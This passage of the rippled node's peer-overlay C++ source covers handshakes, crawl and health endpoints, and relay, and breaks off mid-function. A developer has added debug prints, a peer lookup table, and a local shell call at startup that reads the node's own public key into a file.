//------------------------------------------------------------------------------
/*
    This file is part of rippled: https://github.com/ripple/rippled
    Copyright (c) 2012, 2013 Ripple Labs Inc.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose  with  or without fee is hereby granted, provided that the above
    copyright notice and this permission notice appear in all copies.

    THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
    WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
    MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
    ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
    WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
    ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
    OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

#include <ripple/app/ledger/LedgerMaster.h>
#include <ripple/app/misc/HashRouter.h>
#include <ripple/app/misc/NetworkOPs.h>
#include <ripple/app/misc/ValidatorList.h>
#include <ripple/app/misc/ValidatorSite.h>
#include <ripple/basics/base64.h>
#include <ripple/basics/make_SSLContext.h>
#include <ripple/beast/core/LexicalCast.h>
#include <ripple/core/DatabaseCon.h>
#include <ripple/nodestore/DatabaseShard.h>
#include <ripple/overlay/Cluster.h>
#include <ripple/overlay/impl/ConnectAttempt.h>
#include <ripple/overlay/impl/PeerImp.h>
#include <ripple/overlay/predicates.h>
#include <ripple/peerfinder/make_Manager.h>
#include <ripple/rpc/handlers/GetCounts.h>
#include <ripple/rpc/json_body.h>
#include <ripple/server/SimpleWriter.h>

#include <boost/algorithm/string/predicate.hpp>
#include <boost/utility/in_place_factory.hpp>

namespace ripple {

namespace CrawlOptions {
enum {
    Disabled = 0,
    Overlay = (1 << 0),
    ServerInfo = (1 << 1),
    ServerCounts = (1 << 2),
    Unl = (1 << 3)
};
}

//------------------------------------------------------------------------------

OverlayImpl::Child::Child(OverlayImpl& overlay) : overlay_(overlay)
{
}

OverlayImpl::Child::~Child()
{
    overlay_.remove(*this);
}

//------------------------------------------------------------------------------

OverlayImpl::Timer::Timer(OverlayImpl& overlay)
    : Child(overlay), timer_(overlay_.io_service_)
{
}

void
OverlayImpl::Timer::stop()
{
    error_code ec;
    timer_.cancel(ec);
}

void
OverlayImpl::Timer::run()
{
    timer_.expires_from_now(std::chrono::seconds(1));
    timer_.async_wait(overlay_.strand_.wrap(std::bind(
        &Timer::on_timer, shared_from_this(), std::placeholders::_1)));
}

void
OverlayImpl::Timer::on_timer(error_code ec)
{
    if (ec || overlay_.isStopping())
    {
        if (ec && ec != boost::asio::error::operation_aborted)
        {
            JLOG(overlay_.journal_.error()) << "on_timer: " << ec.message();
        }
        return;
    }

    overlay_.m_peerFinder->once_per_second();
    overlay_.sendEndpoints();
    overlay_.autoConnect();

    if ((++overlay_.timer_count_ % Tuning::checkIdlePeers) == 0)
        overlay_.deleteIdlePeers();

    timer_.expires_from_now(std::chrono::seconds(1));
    timer_.async_wait(overlay_.strand_.wrap(std::bind(
        &Timer::on_timer, shared_from_this(), std::placeholders::_1)));
}

//------------------------------------------------------------------------------

OverlayImpl::OverlayImpl(
    Application& app,
    Setup const& setup,
    Stoppable& parent,
    ServerHandler& serverHandler,
    Resource::Manager& resourceManager,
    Resolver& resolver,
    boost::asio::io_service& io_service,
    BasicConfig const& config,
    beast::insight::Collector::ptr const& collector)
    : Overlay(parent)
    , app_(app)
    , io_service_(io_service)
    , work_(boost::in_place(std::ref(io_service_)))
    , strand_(io_service_)
    , setup_(setup)
    , journal_(app_.journal("Overlay"))
    , serverHandler_(serverHandler)
    , m_resourceManager(resourceManager)
    , m_peerFinder(PeerFinder::make_Manager(
          *this,
          io_service,
          stopwatch(),
          app_.journal("PeerFinder"),
          config,
          collector))
    , m_resolver(resolver)
    , next_id_(1)
    , timer_count_(0)
    , slots_(app, *this)
    , m_stats(
          std::bind(&OverlayImpl::collect_metrics, this),
          collector,
          [counts = m_traffic.getCounts(), collector]() {
              std::vector<TrafficGauges> ret;
              ret.reserve(counts.size());

              for (size_t i = 0; i < counts.size(); ++i)
              {
                  ret.push_back(TrafficGauges(counts[i].name, collector));
              }

              return ret;
          }())
{
    beast::PropertyStream::Source::add(m_peerFinder.get());
}

OverlayImpl::~OverlayImpl()
{
    stop();

    // Block until dependent objects have been destroyed.
    // This is just to catch improper use of the Stoppable API.
    //
    std::unique_lock<decltype(mutex_)> lock(mutex_);
    cond_.wait(lock, [this] { return list_.empty(); });
}

//------------------------------------------------------------------------------


Handoff
OverlayImpl::onHandoff(
    std::unique_ptr<stream_type>&& stream_ptr,
    http_request_type&& request,
    endpoint_type remote_endpoint)
{

    auto const id = next_id_++;
    beast::WrappedSink sink(app_.logs()["Peer"], makePrefix(id));
    beast::Journal journal(sink);

    Handoff handoff;
    if (processRequest(request, handoff))
        return handoff;
    if (!isPeerUpgrade(request))
        return handoff;

    handoff.moved = true;

    JLOG(journal.debug()) << "Peer connection upgrade from " << remote_endpoint;

    error_code ec;
    auto const local_endpoint(
        stream_ptr->next_layer().socket().local_endpoint(ec));
    if (ec)
    {
        JLOG(journal.debug()) << remote_endpoint << " failed: " << ec.message();
        return handoff;
    }

    auto consumer = m_resourceManager.newInboundEndpoint(
        beast::IPAddressConversion::from_asio(remote_endpoint));
    if (consumer.disconnect())
        return handoff;

    auto const slot = m_peerFinder->new_inbound_slot(
        beast::IPAddressConversion::from_asio(local_endpoint),
        beast::IPAddressConversion::from_asio(remote_endpoint));

    if (slot == nullptr)
    {
        // self-connect, close
        handoff.moved = false;
        return handoff;
    }

    // Validate HTTP request

    {
        auto const types = beast::rfc2616::split_commas(request["Connect-As"]);
        if (std::find_if(types.begin(), types.end(), [](std::string const& s) {
                return boost::iequals(s, "peer");
            }) == types.end())
        {
            handoff.moved = false;
            handoff.response =
                makeRedirectResponse(slot, request, remote_endpoint.address());
            handoff.keep_alive = beast::rfc2616::is_keep_alive(request);
            return handoff;
        }
    }

    auto const negotiatedVersion = negotiateProtocolVersion(request["Upgrade"]);
    if (!negotiatedVersion)
    {
        m_peerFinder->on_closed(slot);
        handoff.moved = false;
        handoff.response = makeErrorResponse(
            slot,
            request,
            remote_endpoint.address(),
            "Unable to agree on a protocol version");
        handoff.keep_alive = false;
        return handoff;
    }

    auto const sharedValue = makeSharedValue(*stream_ptr, journal);
    if (!sharedValue)
    {
        m_peerFinder->on_closed(slot);
        handoff.moved = false;
        handoff.response = makeErrorResponse(
            slot,
            request,
            remote_endpoint.address(),
            "Incorrect security cookie");
        handoff.keep_alive = false;
        return handoff;
    }

    try
    {
        auto publicKey = verifyHandshake(
            request,
            *sharedValue,
            setup_.networkID,
            setup_.public_ip,
            remote_endpoint.address(),
            app_);

        {
            // The node gets a reserved slot if it is in our cluster
            // or if it has a reservation.
            bool const reserved =
                static_cast<bool>(app_.cluster().member(publicKey)) ||
                app_.peerReservations().contains(publicKey);
            auto const result =
                m_peerFinder->activate(slot, publicKey, reserved);
            if (result != PeerFinder::Result::success)
            {
                m_peerFinder->on_closed(slot);
                JLOG(journal.debug())
                    << "Peer " << remote_endpoint << " redirected, slots full";
                handoff.moved = false;
                handoff.response = makeRedirectResponse(
                    slot, request, remote_endpoint.address());
                handoff.keep_alive = false;
                return handoff;
            }
        }

        auto const peer = std::make_shared<PeerImp>(
            app_,
            id,
            slot,
            std::move(request),
            publicKey,
            *negotiatedVersion,
            consumer,
            std::move(stream_ptr),
            *this);
        {
            // As we are not on the strand, run() must be called
            // while holding the lock, otherwise new I/O can be
            // queued after a call to stop().
            std::lock_guard<decltype(mutex_)> lock(mutex_);
            {
                auto const result = m_peers.emplace(peer->slot(), peer);
                assert(result.second);
                (void)result.second;
            }
            list_.emplace(peer.get(), peer);

            peer->run();
        }

        std::cout << "RYCB After peer created on onHandoff" << std::endl;
        
        //RYCB
        //Add to the translation table
        //The index of the translation table is the publicKey base58 (string)
        std::string ephemeral_key = ripple::toBase58(ripple::TokenType::NodePublic, publicKey);
        peerObjs[ephemeral_key] = peer;

        auto peerIDtest = peerObjs[ephemeral_key]->id();

        std::cout << "RYCB PEER INSERTED ON THE LIST " << peerIDtest << std::endl;
        std::cout << ephemeral_key << std::endl;

        handoff.moved = true;
        return handoff;
    }
    catch (std::exception const& e)
    {
        JLOG(journal.debug()) << "Peer " << remote_endpoint
                              << " fails handshake (" << e.what() << ")";

        m_peerFinder->on_closed(slot);
        handoff.moved = false;
        handoff.response = makeErrorResponse(
            slot, request, remote_endpoint.address(), e.what());
        handoff.keep_alive = false;
        return handoff;
    }
}

//------------------------------------------------------------------------------

bool
OverlayImpl::isPeerUpgrade(http_request_type const& request)
{
    if (!is_upgrade(request))
        return false;
    auto const versions = parseProtocolVersions(request["Upgrade"]);
    return !versions.empty();
}

std::string
OverlayImpl::makePrefix(std::uint32_t id)
{
    std::stringstream ss;
    ss << "[" << std::setfill('0') << std::setw(3) << id << "] ";
    return ss.str();
}

std::shared_ptr<Writer>
OverlayImpl::makeRedirectResponse(
    std::shared_ptr<PeerFinder::Slot> const& slot,
    http_request_type const& request,
    address_type remote_address)
{
    boost::beast::http::response<json_body> msg;
    msg.version(request.version());
    msg.result(boost::beast::http::status::service_unavailable);
    msg.insert("Server", BuildInfo::getFullVersionString());
    {
        std::ostringstream ostr;
        ostr << remote_address;
        msg.insert("Remote-Address", ostr.str());
    }
    msg.insert("Content-Type", "application/json");
    msg.insert(boost::beast::http::field::connection, "close");
    msg.body() = Json::objectValue;
    {
        Json::Value& ips = (msg.body()["peer-ips"] = Json::arrayValue);
        for (auto const& _ : m_peerFinder->redirect(slot))
            ips.append(_.address.to_string());
    }
    msg.prepare_payload();
    return std::make_shared<SimpleWriter>(msg);
}

std::shared_ptr<Writer>
OverlayImpl::makeErrorResponse(
    std::shared_ptr<PeerFinder::Slot> const& slot,
    http_request_type const& request,
    address_type remote_address,
    std::string text)
{
    boost::beast::http::response<boost::beast::http::empty_body> msg;
    msg.version(request.version());
    msg.result(boost::beast::http::status::bad_request);
    msg.reason("Bad Request (" + text + ")");
    msg.insert("Server", BuildInfo::getFullVersionString());
    msg.insert("Remote-Address", remote_address.to_string());
    msg.insert(boost::beast::http::field::connection, "close");
    msg.prepare_payload();
    return std::make_shared<SimpleWriter>(msg);
}

//------------------------------------------------------------------------------

void
OverlayImpl::connect(beast::IP::Endpoint const& remote_endpoint)
{
    assert(work_);

    auto usage = resourceManager().newOutboundEndpoint(remote_endpoint);
    if (usage.disconnect())
    {
        JLOG(journal_.info()) << "Over resource limit: " << remote_endpoint;
        return;
    }

    auto const slot = peerFinder().new_outbound_slot(remote_endpoint);
    if (slot == nullptr)
    {
        JLOG(journal_.debug()) << "Connect: No slot for " << remote_endpoint;
        return;
    }

    auto const p = std::make_shared<ConnectAttempt>(
        app_,
        io_service_,
        beast::IPAddressConversion::to_asio_endpoint(remote_endpoint),
        usage,
        setup_.context,
        next_id_++,
        slot,
        app_.journal("Peer"),
        *this);

    std::lock_guard lock(mutex_);
    list_.emplace(p.get(), p);
    p->run();
}

//------------------------------------------------------------------------------

// Adds a peer that is already handshaked and active
void
OverlayImpl::add_active(std::shared_ptr<PeerImp> const& peer)
{
    std::lock_guard lock(mutex_);

    {
        auto const result = m_peers.emplace(peer->slot(), peer);
        assert(result.second);
        (void)result.second;
    }

    {
        auto const result = ids_.emplace(
            std::piecewise_construct,
            std::make_tuple(peer->id()),
            std::make_tuple(peer));
        assert(result.second);
        (void)result.second;
    }

    list_.emplace(peer.get(), peer);

    JLOG(journal_.debug()) << "activated " << peer->getRemoteAddress() << " ("
                           << peer->id() << ":"
                           << toBase58(
                                  TokenType::NodePublic, peer->getNodePublic())
                           << ")";

    // As we are not on the strand, run() must be called
    // while holding the lock, otherwise new I/O can be
    // queued after a call to stop().
    peer->run();
}

void
OverlayImpl::remove(std::shared_ptr<PeerFinder::Slot> const& slot)
{
    std::lock_guard lock(mutex_);
    auto const iter = m_peers.find(slot);
    assert(iter != m_peers.end());
    m_peers.erase(iter);
}

//------------------------------------------------------------------------------
//
// Stoppable
//
//------------------------------------------------------------------------------

// Caller must hold the mutex
void
OverlayImpl::checkStopped()
{
    if (isStopping() && areChildrenStopped() && list_.empty())
        stopped();
}

void
OverlayImpl::onPrepare()
{

    //RYCB
    //Put the connection to the node.js gRPC libp2p module here
    //Seems to be a good place
    std::string target_str;
    

    PeerFinder::Config config = PeerFinder::Config::makeConfig(
        app_.config(),
        serverHandler_.setup().overlay.port,
        !app_.getValidationPublicKey().empty(),
        setup_.ipLimit);

    m_peerFinder->setConfig(config);

    // Populate our boot cache: if there are no entries in [ips] then we use
    // the entries in [ips_fixed].
    auto bootstrapIps =
        app_.config().IPS.empty() ? app_.config().IPS_FIXED : app_.config().IPS;

    // If nothing is specified, default to several well-known high-capacity
    // servers to serve as bootstrap:
    if (bootstrapIps.empty())
    {
        // Pool of servers operated by Ripple Labs Inc. - https://ripple.com
        bootstrapIps.push_back("r.ripple.com 51235");

        // Pool of servers operated by Alloy Networks - https://www.alloy.ee
        bootstrapIps.push_back("zaphod.alloy.ee 51235");

        // Pool of servers operated by ISRDC - https://isrdc.in
        bootstrapIps.push_back("sahyadri.isrdc.in 51235");
    }

    m_resolver.resolve(
        bootstrapIps,
        [this](
            std::string const& name,
            std::vector<beast::IP::Endpoint> const& addresses) {
            std::vector<std::string> ips;
            ips.reserve(addresses.size());
            for (auto const& addr : addresses)
            {
                if (addr.port() == 0)
                    ips.push_back(to_string(addr.at_port(DEFAULT_PEER_PORT)));
                else
                    ips.push_back(to_string(addr));
            }

            std::string const base("config: ");
            if (!ips.empty())
                m_peerFinder->addFallbackStrings(base + name, ips);
        });

    // Add the ips_fixed from the rippled.cfg file
    if (!app_.config().standalone() && !app_.config().IPS_FIXED.empty())
    {
        m_resolver.resolve(
            app_.config().IPS_FIXED,
            [this](
                std::string const& name,
                std::vector<beast::IP::Endpoint> const& addresses) {
                std::vector<beast::IP::Endpoint> ips;
                ips.reserve(addresses.size());

                for (auto& addr : addresses)
                {
                    if (addr.port() == 0)
                        ips.emplace_back(addr.address(), DEFAULT_PEER_PORT);
                    else
                        ips.emplace_back(addr);
                }

                if (!ips.empty())
                    m_peerFinder->addFixedPeer(name, ips);
            });
    }
}

//Execute command to get the ephemeral key and put it into the proto messag
//from https://stackoverflow.com/a/478960
std::string execShell(const char* cmd)
{
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


void
OverlayImpl::onStart()
{
    auto shellResult = execShell("./rippled server_info --conf /opt/local/etc/rippled.cfg | cat | grep \"pubkey_node\" | cut -d \":\" -f2 | cut -d \"\\\"\" -f2 > key.out");
    auto const timer = std::make_shared<Timer>(*this);
    std::lock_guard lock(mutex_);
    list_.emplace(timer.get(), timer);
    timer_ = timer;
    timer->run();
}

void
OverlayImpl::onStop()
{
    strand_.dispatch(std::bind(&OverlayImpl::stop, this));
}

void
OverlayImpl::onChildrenStopped()
{
    std::lock_guard lock(mutex_);
    checkStopped();
}

//------------------------------------------------------------------------------
//
// PropertyStream
//
//------------------------------------------------------------------------------

void
OverlayImpl::onWrite(beast::PropertyStream::Map& stream)
{
    beast::PropertyStream::Set set("traffic", stream);
    auto const stats = m_traffic.getCounts();
    for (auto const& i : stats)
    {
        if (i)
        {
            beast::PropertyStream::Map item(set);
            item["category"] = i.name;
            item["bytes_in"] = std::to_string(i.bytesIn.load());
            item["messages_in"] = std::to_string(i.messagesIn.load());
            item["bytes_out"] = std::to_string(i.bytesOut.load());
            item["messages_out"] = std::to_string(i.messagesOut.load());
        }
    }
}

//------------------------------------------------------------------------------
/** A peer has connected successfully
    This is called after the peer handshake has been completed and during
    peer activation. At this point, the peer address and the public key
    are known.
*/
void
OverlayImpl::activate(std::shared_ptr<PeerImp> const& peer)
{
    // Now track this peer
    {
        std::lock_guard lock(mutex_);
        auto const result(ids_.emplace(
            std::piecewise_construct,
            std::make_tuple(peer->id()),
            std::make_tuple(peer)));
        assert(result.second);
        (void)result.second;
    }

    JLOG(journal_.debug()) << "activated " << peer->getRemoteAddress() << " ("
                           << peer->id() << ":"
                           << toBase58(
                                  TokenType::NodePublic, peer->getNodePublic())
                           << ")";

    // We just accepted this peer so we have non-zero active peers
    assert(size() != 0);
}

void
OverlayImpl::onPeerDeactivate(Peer::id_t id)
{
    std::lock_guard lock(mutex_);
    ids_.erase(id);
}

void
OverlayImpl::onManifests(
    std::shared_ptr<protocol::TMManifests> const& m,
    std::shared_ptr<PeerImp> const& from)
{
    auto const n = m->list_size();
    auto const& journal = from->pjournal();

    protocol::TMManifests relay;

    for (std::size_t i = 0; i < n; ++i)
    {
        auto& s = m->list().Get(i).stobject();

        if (auto mo = deserializeManifest(s))
        {
            auto const serialized = mo->serialized;

            auto const result =
                app_.validatorManifests().applyManifest(std::move(*mo));

            if (result == ManifestDisposition::accepted)
            {
                relay.add_list()->set_stobject(s);

                // N.B.: this is important; the applyManifest call above moves
                //       the loaded Manifest out of the optional so we need to
                //       reload it here.
                mo = deserializeManifest(serialized);
                assert(mo);

                app_.getOPs().pubManifest(*mo);

                if (app_.validators().listed(mo->masterKey))
                {
                    auto db = app_.getWalletDB().checkoutDb();

                    soci::transaction tr(*db);
                    static const char* const sql =
                        "INSERT INTO ValidatorManifests (RawData) VALUES "
                        "(:rawData);";
                    soci::blob rawData(*db);
                    convert(serialized, rawData);
                    *db << sql, soci::use(rawData);
                    tr.commit();
                }
            }
        }
        else
        {
            JLOG(journal.debug())
                << "Malformed manifest #" << i + 1 << ": " << strHex(s);
            continue;
        }
    }

    if (!relay.list().empty())
        for_each([m2 = std::make_shared<Message>(relay, protocol::mtMANIFESTS)](
                     std::shared_ptr<PeerImp>&& p) { p->send(m2); });
}

void
OverlayImpl::reportTraffic(
    TrafficCount::category cat,
    bool isInbound,
    int number)
{
    m_traffic.addCount(cat, isInbound, number);
}

Json::Value
OverlayImpl::crawlShards(bool pubKey, std::uint32_t hops)
{
    using namespace std::chrono;
    using namespace std::chrono_literals;

    Json::Value jv(Json::objectValue);
    auto const numPeers{size()};
    if (numPeers == 0)
        return jv;

    // If greater than a hop away, we may need to gather or freshen data
    if (hops > 0)
    {
        // Prevent crawl spamming
        clock_type::time_point const last(csLast_.load());
        if ((clock_type::now() - last) > 60s)
        {
            auto const timeout(seconds((hops * hops) * 10));
            std::unique_lock<std::mutex> l{csMutex_};

            // Check if already requested
            if (csIDs_.empty())
            {
                {
                    std::lock_guard lock{mutex_};
                    for (auto& id : ids_)
                        csIDs_.emplace(id.first);
                }

                // Relay request to active peers
                protocol::TMGetPeerShardInfo tmGPS;
                tmGPS.set_hops(hops);
                foreach(send_always(std::make_shared<Message>(
                    tmGPS, protocol::mtGET_PEER_SHARD_INFO)));

                if (csCV_.wait_for(l, timeout) == std::cv_status::timeout)
                {
                    csIDs_.clear();
                    csCV_.notify_all();
                }
                csLast_ = duration_cast<seconds>(
                    clock_type::now().time_since_epoch());
            }
            else
                csCV_.wait_for(l, timeout);
        }
    }

    // Combine the shard info from peers and their sub peers
    hash_map<PublicKey, PeerImp::ShardInfo> peerShardInfo;
    for_each([&](std::shared_ptr<PeerImp> const& peer) {
        if (auto psi = peer->getPeerShardInfo())
        {
            // e is non-const so it may be moved from
            for (auto& e : *psi)
            {
                auto it{peerShardInfo.find(e.first)};
                if (it != peerShardInfo.end())
                    // The key exists so join the shard indexes.
                    it->second.shardIndexes += e.second.shardIndexes;
                else
                    peerShardInfo.emplace(std::move(e));
            }
        }
    });

    // Prepare json reply
    auto& av = jv[jss::peers] = Json::Value(Json::arrayValue);
    for (auto const& e : peerShardInfo)
    {
        auto& pv{av.append(Json::Value(Json::objectValue))};
        if (pubKey)
            pv[jss::public_key] = toBase58(TokenType::NodePublic, e.first);

        auto const& address{e.second.endpoint.address()};
        if (!address.is_unspecified())
            pv[jss::ip] = address.to_string();

        pv[jss::complete_shards] = to_string(e.second.shardIndexes);
    }

    return jv;
}

void
OverlayImpl::lastLink(std::uint32_t id)
{
    // Notify threads when every peer has received a last link.
    // This doesn't account for every node that might reply but
    // it is adequate.
    std::lock_guard l{csMutex_};
    if (csIDs_.erase(id) && csIDs_.empty())
        csCV_.notify_all();
}

/** The number of active peers on the network
    Active peers are only those peers that have completed the handshake
    and are running the Ripple protocol.
*/
std::size_t
OverlayImpl::size() const
{
    std::lock_guard lock(mutex_);
    return ids_.size();
}

int
OverlayImpl::limit()
{
    return m_peerFinder->config().maxPeers;
}

Json::Value
OverlayImpl::getOverlayInfo()
{
    using namespace std::chrono;
    Json::Value jv;
    auto& av = jv["active"] = Json::Value(Json::arrayValue);

    for_each([&](std::shared_ptr<PeerImp>&& sp) {
        auto& pv = av.append(Json::Value(Json::objectValue));
        pv[jss::public_key] = base64_encode(
            sp->getNodePublic().data(), sp->getNodePublic().size());
        pv[jss::type] = sp->slot()->inbound() ? "in" : "out";
        pv[jss::uptime] = static_cast<std::uint32_t>(
            duration_cast<seconds>(sp->uptime()).count());
        if (sp->crawl())
        {
            pv[jss::ip] = sp->getRemoteAddress().address().to_string();
            if (sp->slot()->inbound())
            {
                if (auto port = sp->slot()->listening_port())
                    pv[jss::port] = *port;
            }
            else
            {
                pv[jss::port] = std::to_string(sp->getRemoteAddress().port());
            }
        }

        {
            auto version{sp->getVersion()};
            if (!version.empty())
                // Could move here if Json::value supported moving from strings
                pv[jss::version] = version;
        }

        std::uint32_t minSeq, maxSeq;
        sp->ledgerRange(minSeq, maxSeq);
        if (minSeq != 0 || maxSeq != 0)
            pv[jss::complete_ledgers] =
                std::to_string(minSeq) + "-" + std::to_string(maxSeq);

        if (auto shardIndexes = sp->getShardIndexes())
            pv[jss::complete_shards] = to_string(*shardIndexes);
    });

    return jv;
}

Json::Value
OverlayImpl::getServerInfo()
{
    bool const humanReadable = false;
    bool const admin = false;
    bool const counters = false;

    Json::Value server_info =
        app_.getOPs().getServerInfo(humanReadable, admin, counters);

    // Filter out some information
    server_info.removeMember(jss::hostid);
    server_info.removeMember(jss::load_factor_fee_escalation);
    server_info.removeMember(jss::load_factor_fee_queue);
    server_info.removeMember(jss::validation_quorum);

    if (server_info.isMember(jss::validated_ledger))
    {
        Json::Value& validated_ledger = server_info[jss::validated_ledger];

        validated_ledger.removeMember(jss::base_fee);
        validated_ledger.removeMember(jss::reserve_base_xrp);
        validated_ledger.removeMember(jss::reserve_inc_xrp);
    }

    return server_info;
}

Json::Value
OverlayImpl::getServerCounts()
{
    return getCountsJson(app_, 10);
}

Json::Value
OverlayImpl::getUnlInfo()
{
    Json::Value validators = app_.validators().getJson();

    if (validators.isMember(jss::publisher_lists))
    {
        Json::Value& publisher_lists = validators[jss::publisher_lists];

        for (auto& publisher : publisher_lists)
        {
            publisher.removeMember(jss::list);
        }
    }

    validators.removeMember(jss::signing_keys);
    validators.removeMember(jss::trusted_validator_keys);
    validators.removeMember(jss::validation_quorum);

    Json::Value validatorSites = app_.validatorSites().getJson();

    if (validatorSites.isMember(jss::validator_sites))
    {
        validators[jss::validator_sites] =
            std::move(validatorSites[jss::validator_sites]);
    }

    return validators;
}

// Returns information on verified peers.
Json::Value
OverlayImpl::json()
{
    Json::Value json;
    for (auto const& peer : getActivePeers())
    {
        json.append(peer->json());
    }
    return json;
}

bool
OverlayImpl::processCrawl(http_request_type const& req, Handoff& handoff)
{
    if (req.target() != "/crawl" ||
        setup_.crawlOptions == CrawlOptions::Disabled)
        return false;

    boost::beast::http::response<json_body> msg;
    msg.version(req.version());
    msg.result(boost::beast::http::status::ok);
    msg.insert("Server", BuildInfo::getFullVersionString());
    msg.insert("Content-Type", "application/json");
    msg.insert("Connection", "close");
    msg.body()["version"] = Json::Value(2u);

    if (setup_.crawlOptions & CrawlOptions::Overlay)
    {
        msg.body()["overlay"] = getOverlayInfo();
    }
    if (setup_.crawlOptions & CrawlOptions::ServerInfo)
    {
        msg.body()["server"] = getServerInfo();
    }
    if (setup_.crawlOptions & CrawlOptions::ServerCounts)
    {
        msg.body()["counts"] = getServerCounts();
    }
    if (setup_.crawlOptions & CrawlOptions::Unl)
    {
        msg.body()["unl"] = getUnlInfo();
    }

    msg.prepare_payload();
    handoff.response = std::make_shared<SimpleWriter>(msg);
    return true;
}

bool
OverlayImpl::processValidatorList(
    http_request_type const& req,
    Handoff& handoff)
{
    // If the target is in the form "/vl/<validator_list_public_key>",
    // return the most recent validator list for that key.
    constexpr std::string_view prefix("/vl/");

    if (!req.target().starts_with(prefix.data()) || !setup_.vlEnabled)
        return false;

    std::uint32_t version = 1;

    boost::beast::http::response<json_body> msg;
    msg.version(req.version());
    msg.insert("Server", BuildInfo::getFullVersionString());
    msg.insert("Content-Type", "application/json");
    msg.insert("Connection", "close");

    auto fail = [&msg, &handoff](auto status) {
        msg.result(status);
        msg.insert("Content-Length", "0");

        msg.body() = Json::nullValue;

        msg.prepare_payload();
        handoff.response = std::make_shared<SimpleWriter>(msg);
        return true;
    };

    auto key = req.target().substr(prefix.size());

    if (auto slash = key.find('/'); slash != boost::string_view::npos)
    {
        auto verString = key.substr(0, slash);
        if (!boost::conversion::try_lexical_convert(verString, version))
            return fail(boost::beast::http::status::bad_request);
        key = key.substr(slash + 1);
    }

    if (key.empty())
        return fail(boost::beast::http::status::bad_request);

    // find the list
    auto vl = app_.validators().getAvailable(key, version);

    if (!vl)
    {
        // 404 not found
        return fail(boost::beast::http::status::not_found);
    }
    else if (!*vl)
    {
        return fail(boost::beast::http::status::bad_request);
    }
    else
    {
        msg.result(boost::beast::http::status::ok);

        msg.body() = *vl;

        msg.prepare_payload();
        handoff.response = std::make_shared<SimpleWriter>(msg);
        return true;
    }
}

bool
OverlayImpl::processHealth(http_request_type const& req, Handoff& handoff)
{
    if (req.target() != "/health")
        return false;
    boost::beast::http::response<json_body> msg;
    msg.version(req.version());
    msg.insert("Server", BuildInfo::getFullVersionString());
    msg.insert("Content-Type", "application/json");
    msg.insert("Connection", "close");

    auto info = getServerInfo();

    int last_validated_ledger_age = -1;
    if (info.isMember("validated_ledger"))
        last_validated_ledger_age = info["validated_ledger"]["age"].asInt();
    bool amendment_blocked = false;
    if (info.isMember("amendment_blocked"))
        amendment_blocked = true;
    int number_peers = info["peers"].asInt();
    std::string server_state = info["server_state"].asString();
    auto load_factor =
        info["load_factor"].asDouble() / info["load_base"].asDouble();

    enum { healthy, warning, critical };
    int health = healthy;
    auto set_health = [&health](int state) {
        if (health < state)
            health = state;
    };

    msg.body()[jss::info] = Json::objectValue;
    if (last_validated_ledger_age >= 7 || last_validated_ledger_age < 0)
    {
        msg.body()[jss::info]["validated_ledger"] = last_validated_ledger_age;
        if (last_validated_ledger_age < 20)
            set_health(warning);
        else
            set_health(critical);
    }

    if (amendment_blocked)
    {
        msg.body()[jss::info]["amendment_blocked"] = true;
        set_health(critical);
    }

    if (number_peers <= 7)
    {
        msg.body()[jss::info]["peers"] = number_peers;
        if (number_peers != 0)
            set_health(warning);
        else
            set_health(critical);
    }

    if (!(server_state == "full" || server_state == "validating" ||
          server_state == "proposing"))
    {
        msg.body()[jss::info]["server_state"] = server_state;
        if (server_state == "syncing" || server_state == "tracking" ||
            server_state == "connected")
        {
            set_health(warning);
        }
        else
            set_health(critical);
    }

    if (load_factor > 100)
    {
        msg.body()[jss::info]["load_factor"] = load_factor;
        if (load_factor < 1000)
            set_health(warning);
        else
            set_health(critical);
    }

    switch (health)
    {
        case healthy:
            msg.result(boost::beast::http::status::ok);
            break;
        case warning:
            msg.result(boost::beast::http::status::service_unavailable);
            break;
        case critical:
            msg.result(boost::beast::http::status::internal_server_error);
            break;
    }

    msg.prepare_payload();
    handoff.response = std::make_shared<SimpleWriter>(msg);
    return true;
}

bool
OverlayImpl::processRequest(http_request_type const& req, Handoff& handoff)
{
    // Take advantage of || short-circuiting
    return processCrawl(req, handoff) || processValidatorList(req, handoff) ||
        processHealth(req, handoff);
}

Overlay::PeerSequence
OverlayImpl::getActivePeers() const
{
    Overlay::PeerSequence ret;
    ret.reserve(size());

    for_each([&ret](std::shared_ptr<PeerImp>&& sp) {
        ret.emplace_back(std::move(sp));
    });

    return ret;
}

void
OverlayImpl::checkTracking(std::uint32_t index)
{
    for_each(
        [index](std::shared_ptr<PeerImp>&& sp) { sp->checkTracking(index); });
}

std::shared_ptr<Peer>
OverlayImpl::findPeerByShortID(Peer::id_t const& id) const
{
    std::lock_guard lock(mutex_);
    auto const iter = ids_.find(id);
    if (iter != ids_.end())
        return iter->second.lock();
    return {};
}

// A public key hash map was not used due to the peer connect/disconnect
// update overhead outweighing the performance of a small set linear search.
std::shared_ptr<Peer>
OverlayImpl::findPeerByPublicKey(PublicKey const& pubKey)
{
    std::lock_guard lock(mutex_);
    for (auto const& e : ids_)
    {
        if (auto peer = e.second.lock())
        {
            if (peer->getNodePublic() == pubKey)
                return peer;
        }
    }
    return {};
}

void
OverlayImpl::broadcast(protocol::TMProposeSet& m)
{
    auto const sm = std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER);
    for_each([&](std::shared_ptr<PeerImp>&& p) { p->send(sm); });
}

std::set<Peer::id_t>
OverlayImpl::relay(
    protocol::TMProposeSet& m,
    uint256 const& uid,
    PublicKey const& validator)
{
    if (auto const toSkip = app_.getHashRouter().shouldRelay(uid))
    {
        auto const sm =
